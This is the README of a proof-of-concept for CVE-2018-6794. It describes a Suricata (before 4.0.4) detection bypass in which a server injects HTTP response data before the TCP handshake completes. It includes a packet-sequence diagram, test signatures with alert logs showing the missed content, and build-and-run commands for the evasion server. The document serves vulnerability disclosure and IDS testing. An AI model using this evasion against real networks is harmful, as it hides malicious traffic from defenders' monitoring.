## Disclaimer

This program is for Educational purpose ONLY. Do not use it without permission.

## Proof-Of-Concept for CVE-2018-6794.

If as a server side you break a normal TCP 3 way handshake packets order and inject some response data before 3whs is complete then data still will be received by the client but some IDS engines may skip content checks on that.

```
Client    ->  [SYN] [Seq=0 Ack= 0]           ->  Evil Server     # Client starts a TCP 3-way handshake
Client    <-  [SYN, ACK] [Seq=0 Ack= 1]      <-  Evil Server     # Server responses as it should, but ...
Client    <-  [PSH, ACK] [Seq=1 Ack= 1]      <-  Evil Server     # It sends HTTP response before the 3whs is completed
Client    <-  [FIN, ACK] [Seq=83 Ack= 1]     <-  Evil Server     # Moreover it finishes TCP session 
Client    ->  [ACK] [Seq=1 Ack= 84]          ->  Evil Server     # Client finishes TCP 3whs by sending ACK packet and confirms data from server
Client    ->  [PSH, ACK] [Seq=1 Ack= 84]     ->  Evil Server     # Then it sends a HTTP GET request as nothing wrong happened
```

Suricata < 4.0.4 is prone to this issue: HTTP or Stream-TCP signatures will not alert on the injected content.
We do not see any alerts on an evil http response data if we apply the following signatures against PoC network traffic 

```
alert tcp any any -> any any (msg: "TCP BEEN NO_STREAM RULE"; flow: no_stream; content: "been"; sid: 1; )
alert tcp any any -> any any (msg: "TCP BEEN ONLY_STREAM RULE"; flow: only_stream; content: "been"; sid: 2; )
alert http any any -> any any (msg: "HTTP BEEN RULE"; content: "been"; sid: 3; )
alert tcp any any -> any any (msg: "TCP GET NO_STREAM RULE"; flow: no_stream; content: "GET"; sid: 4; )
alert tcp any any -> any any (msg: "TCP GET ONLY_STREAM RULE"; flow: only_stream; content: "GET"; sid: 5; )
alert http any any -> any any (msg: "HTTP GET RULE"; content: "GET"; sid: 6; )

03/02/2018-11:08:13.012990  [**] [1:1:0] TCP BEEN NO_STREAM RULE [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.235.101:80 -> 192.168.235.1:56581
03/02/2018-11:08:13.013610  [**] [1:4:0] TCP GET NO_STREAM RULE [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.235.1:56581 -> 192.168.235.101:80
03/02/2018-11:08:13.018914  [**] [1:5:0] TCP GET ONLY_STREAM RULE [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.235.1:56581 -> 192.168.235.101:80
03/02/2018-11:08:13.018914  [**] [1:6:0] HTTP GET RULE [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.235.1:56581 -> 192.168.235.101:80
```

This technique may be applied for other Intrusion Detection or Network Monitoring tools and systems.

## Author and Credits
Kirill Shipulin from Positive Technologies (@kirill_wow)

## Usage
```
git clone https://github.com/kirillwow/ids_bypass.git
cd ids_bypass
make
sudo iptables -A OUTPUT -p tcp --sport 80 --tcp-flags RST RST -j DROP
sudo  ./server
sudo ./server -i eno16777736 -p 80
```


![alt PoC](https://github.com/kirillwow/ids_bypass/raw/master/screenshot.png)
